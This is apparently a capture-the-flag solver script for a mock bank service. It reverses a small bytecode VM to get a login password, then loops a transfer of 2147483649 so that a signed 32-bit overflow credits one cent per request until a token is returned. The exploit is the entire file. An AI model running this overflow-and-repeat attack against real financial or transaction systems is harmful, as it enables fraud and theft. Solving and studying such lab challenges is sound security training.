#!/usr/bin/env python3
"""
Solver for Bank 4 — Desert Gold Exchange
Exploit: Integer Overflow — signed int32 wrap leaves 1 cent remainder

VM Reversal:
  Bytecode: 05 4B  05 37  03  01
  PUSH 0x4B → PUSH 0x37 → XOR → HALT
  TOS = 0x4B ^ 0x37 = 0x7C
  Password = "DSGLD_7C7C"

Usage: python3 solve_bank4.py <host> [port]
"""
import socket, time, sys, ctypes

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9004

# VM execution result
BYTECODE = [0x05, 0x4B, 0x05, 0x37, 0x03, 0x01]

def execute_vm(bc):
    stack = []
    i = 0
    while i < len(bc):
        op = bc[i]
        if op == 0x05:
            stack.append(bc[i+1]); i += 2
        elif op == 0x03:
            a, b = stack.pop(), stack.pop()
            stack.append(a ^ b); i += 1
        elif op == 0x01:
            break
        else:
            i += 1
    return stack[0] if stack else 0

result = execute_vm(BYTECODE)
PASSWORD = f"DSGLD_{result:02X}7C"

# Integer overflow magic: 2147483649 → int32 wrap → remainder 1 cent
INT32_MAX = 0x7FFFFFFF
MAGIC = str(INT32_MAX + 2)  # = 2147483649
DELAY = 1 / 150


def solve():
    print(f"[*] Connecting to {HOST}:{PORT}")
    print(f"[*] VM execution result: 0x{result:02X}")
    print(f"[*] Password (from VM): {PASSWORD}")
    print(f"[*] Magic overflow value: {MAGIC}")

    s = socket.socket()
    s.connect((HOST, PORT))
    s.settimeout(10)

    def recv_prompt(p):
        buf = b""
        while p.encode() not in buf:
            buf += s.recv(4096)
        return buf.decode(errors="replace")

    recv_prompt("Password: ")
    s.sendall((PASSWORD + "\n").encode())

    welcome = recv_prompt("desert> ")
    print(welcome.strip())

    if "FAILED" in welcome:
        print("[-] Auth failed."); s.close(); return None

    token = None
    count = 0
    t_start = time.time()

    print("[*] Starting Integer Overflow exploit")

    while not token:
        s.sendall(f"transfer {MAGIC}\n".encode())
        resp = b""
        while b"desert> " not in resp and b"TOKEN_" not in resp:
            resp += s.recv(4096)
        resp = resp.decode(errors="replace")

        count += 1
        if count % 1000 == 0:
            elapsed = time.time() - t_start
            rate = count / elapsed
            print(f"\r[*] Tx: {count:,} | ${count/100:.2f} | {rate:.0f}/s", end="", flush=True)

        if "TOKEN_" in resp:
            for line in resp.split("\n"):
                if "Token:" in line and "TOKEN_" in line:
                    token = line.split("Token:")[-1].strip()
            break

        if "locked" in resp.lower():
            print("\n[-] Locked!"); break

        time.sleep(DELAY)

    print(f"\n[+] DONE — {count:,} tx")
    if token:
        print(f"[+] TOKEN: {token}")
        with open("tokens.txt", "a") as f:
            f.write(f"BANK4:{token}\n")
    s.close()
    return token


if __name__ == "__main__":
    solve()
